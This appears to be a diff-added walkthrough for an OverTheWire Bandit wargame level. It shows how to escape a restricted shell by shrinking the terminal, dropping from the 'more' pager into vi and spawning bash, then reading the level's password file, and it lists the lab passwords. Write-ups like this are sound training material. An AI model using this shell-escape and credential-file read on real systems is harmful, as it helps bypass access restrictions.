@@ -1,0 +1,50 @@
+🎯 Objective:
+       You can’t log in normally because the shell exits immediately.
+       You must escape from a restricted shell using more and get the password.
+
+Steps to be followed:
+
+Step 1: Login as bandit25 (with private key). Bandit25 gives you an SSH key.
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Step 2: List files
+
+Command: ls
+Output: bandit26.sshkey
+
+Step 3: Try logging in as bandit26
+
+Command: ssh -i bandit26.sshkey bandit26@localhost -p 2220
+
+⚠️ You’ll get logged out immediately — this is expected.
+
+Step 4: Exploit terminal size (important!)
+
+Make your terminal very small (shrink the window).
+Then run again:
+       ssh -i bandit26.sshkey bandit26@localhost -p 2220
+
+Now it opens a more pager instead of exiting.
+
+Step 5: Escape from more
+
+Inside more, press: v
+This opens vi editor.
+
+Step 6: Spawn a shell from vi
+
+Inside vi, type:
+      :set shell=/bin/bash
+      :shell
+
+You now have a shell as bandit26
+
+Step 7: Read the password
+
+Command: cat /etc/bandit_pass/bandit26
+
+Output:
+
+Password for Level 26: 5czgV9L3X0a0n6uD9wJm9xS5dK0gFq8P
